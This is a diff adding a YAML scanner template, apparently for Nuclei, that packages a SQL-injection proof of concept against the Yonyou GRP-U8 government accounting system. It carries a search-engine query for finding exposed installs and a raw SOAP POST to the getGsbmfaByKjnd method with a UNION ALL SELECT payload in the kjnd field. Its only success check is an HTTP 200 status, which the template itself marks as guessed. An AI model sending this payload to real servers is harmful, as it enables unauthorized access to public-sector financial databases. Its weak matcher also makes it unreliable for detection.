@@ -1,0 +1,21 @@
+id: poc-ef85693234e49ee735d3
+info:
+  name: 用友GRP-U8新政府会计制度专版getGsbmfaByKjndSQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ef85693234e49ee735d333c972bdf0d1
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ef85693234e49ee735d333c972bdf0d1
+    fofa: + hunter`app.name="用友GRP-U8 OA"&&web.title="用友GRP-U8 行政事业内控管理软件（新政府会计制度专版）"`
+http:
+- raw:
+  - "POST /services/operOriztion HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nConnection: close\nCookie: JSESSIONID=89E46B07C2BF4021A3C408C6B580CC55\nUpgrade-Insecure-Requests: 1\nSOAPAction:\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 969\n\n<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsdd=\"http://xml.apache.org/axis/wsdd/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <wsdd:getGsbmfaByKjnd soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n <kjnd xsi:type=\"xsd:string\">gero et' UNION ALL SELECT CHAR(113)+CHAR(122)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(79)+CHAR(90)+CHAR(79)+CHAR(72)+CHAR(77)+CHAR(77)+CHAR(118)+CHAR(116)+CHAR(98)+CHAR(76)+CHAR(122)+CHAR(97)+CHAR(85)+CHAR(89)+CHAR(69)+CHAR(117)+CHAR(73)+CHAR(122)+CHAR(100)+CHAR(81)+CHAR(108)+CHAR(103)+CHAR(122)+CHAR(79)+CHAR(110)+CHAR(73)+CHAR(84)+CHAR(111)+CHAR(102)+CHAR(83)+CHAR(103)+CHAR(66)+CHAR(79)+CHAR(101)+CHAR(73)+CHAR(120)+CHAR(83)+CHAR(115)+CHAR(111)+CHAR(102)+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(98)+CHAR(113)-- aKCq</kjnd>\n\n      </wsdd:getGsbmfaByKjnd>\n\n   </soapenv:Body>\n\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
